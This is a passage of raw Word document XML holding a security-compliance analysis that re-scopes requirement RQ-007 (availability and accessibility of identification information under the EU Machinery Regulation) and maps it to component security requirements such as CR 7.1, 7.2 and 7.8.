          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7739E42A" w14:textId="77777777" w:rsidR="009B0AAA" w:rsidRDefault="009B0AAA" w:rsidP="006F109C">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="446C7F38" w14:textId="77777777" w:rsidR="009B0AAA" w:rsidRDefault="009B0AAA" w:rsidP="006F109C">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A2C30B2" w14:textId="77777777" w:rsidR="009B0AAA" w:rsidRDefault="009B0AAA" w:rsidP="006F109C">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30E4B895" w14:textId="77777777" w:rsidR="00960153" w:rsidRPr="003165C7" w:rsidRDefault="00960153" w:rsidP="006F109C">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28A912F0" w14:textId="2B75D1E5" w:rsidR="00960153" w:rsidRPr="00C1714F" w:rsidRDefault="00960153" w:rsidP="00960153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t xml:space="preserve">REQUIREMENT </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="double"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E33271" w14:textId="77777777" w:rsidR="00B84B53" w:rsidRDefault="00B84B53" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3756ABF6" w14:textId="77777777" w:rsidR="003165C7" w:rsidRDefault="003165C7" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="132C8061" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-007 — Reprocessed (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D45C45C" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Correction applied:</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Rechecking RQ-007 against the boundary discipline, I found a </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>framing/scope error</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> rather than an imported-asset error, plus </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>two tests that belong to RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="688ABCF5" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Threat mis-framing (the key correction).</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> My original set the primary threat as**"Denial of Service (attack)."** But re-reading the requirement —</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>"shall be able to provide … at all times"</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>dominant, decisive failing is not a third-party attack; it is the device's own state machine</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Init, install-reboot, SCPU-flash, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>FatalError</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and the documented EMC "not-supervised" concession). That is an </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>inherent availability/reliability limitation</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, not a malicious DoS. The primary should therefore be </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>inherent unavailability (design limitation)</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, with a </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>self-inflicted DoS</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (the 2-connection cap) as the one attack-adjacent, RQ-007-</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>specific</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> vector.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D800468" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Generalized-DoS scope creep → RQ-010.</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> My </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TS-4 (sustained load/flood)</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and the attack-induction of </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TS-5 (COM-fault DoS)</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> are </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>generalized "withstand malicious attempts" = RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. Removed from RQ-007; the </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>availability-architecture</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> half of the COM-fault point is retained as a </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>redundancy/reliability</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> check.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2335D7DC" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Boundary statement (kept explicit).</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-007 is </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>availability + accessibility of the identification info only</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>completeness</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → RQ-006, </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>confidentiality</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → RQ-004/006, </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>generalized DoS resilience</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → RQ-010. (My original correctly did </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> import SBOM or confidentiality — that stays out.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A6D0BC" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:pict w14:anchorId="43CAE2A2">
          <v:rect id="_x0000_i1478" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="11A2B6E2" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 1 — Critical Review &amp; Theoretical Validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A4EB5DF" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.1 Requirement &amp; CR Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A40793" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">EU Machinery Regulation identification obligation with an </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>availability + accessibility</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> qualifier ("at all times," "easily accessible form"). </w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:t xml:space="preserve">Two </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:t>limbs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>availability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> (FR 7)</w:t>
      </w:r>
      <w:r w:rsidRPr="00015538">
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>accessibility</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>readable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00015538">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> form)</w:t>
      </w:r>
      <w:r w:rsidRPr="0001553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501"/>
        <w:gridCol w:w="1545"/>
        <w:gridCol w:w="4298"/>
      </w:tblGrid>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="46DD7A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C36AE5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E89A86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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538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7CDD86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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538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4B2528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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Correction</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="15257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7FE2A" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve">CR 7.8 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>Component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inventory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E5764" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0001553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B71C4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Correct (the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>what</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> is identified)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84F42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Keep — carries over from RQ-006.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="6A16A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94ACD" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve">CR 7.1 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>DoS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protection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78E8A" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0001553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40579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Re-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>scope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2B56B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Keep, but scope to the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>self-inflicted 2-connection</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> vector; </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>generalized malicious DoS</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> → RQ-010.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="63431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3CE72A" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve">CR 7.2 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>Resource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CDC52" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0001553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D1A1F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FEA0F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Keep — the connection cap is a resource-management control (and its own weakness).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00015538" w14:paraId="4E1A2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42A91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CR 6.1 – Audit/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>data</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>accessibility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1CE0C" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> 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A863D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CB0DE" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">The**"easily accessible form"** limb maps here — and is </w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>partially MET</w:t>
            </w:r>
            <w:r w:rsidRPr="00E55DD7">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> via the Visualizer. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>Anchoring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it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makes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the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verdict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precise</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="5D849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47BC4" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">CR 7.7 – Least </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>functionality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CF4C8" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>note</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>supporting</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00015538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769AE" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538">
              <w:t xml:space="preserve">Keep </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00015538">
              <w:t>as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supporting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E2DED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"Incoming-only, no outgoing/subscription" (SRIO-7908) is surface reduction.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00015538" w:rsidRPr="00E55DD7" w14:paraId="6BABD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C1147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del w:id="22" w:author="Unknown">
              <w:r w:rsidRPr="00E55DD7">
                <w:rPr>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:delText>Generalized DoS / flood mapping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FB32D" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00015538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98BC8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→ RQ-010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4479B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"Withstand reasonably foreseeable malicious attempts" (flooding, fuzzing) is RQ-010.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3A85B306" w14:textId="77777777" w:rsidR="00015538" w:rsidRPr="00015538" w:rsidRDefault="00015538" w:rsidP="00015538">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Corrected mapping:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-007 → EHSR identification obligation (availability/accessibility) →</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">{CR 7.8 [inventory], CR 7.1 [self-DoS — 2-connection], CR 7.2 [resource </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>mgmt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>], CR 6.1 [accessible form — partially met]}</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, with </w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CR 7.7</w:t>
      </w:r>
      <w:r w:rsidRPr="00E55DD7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
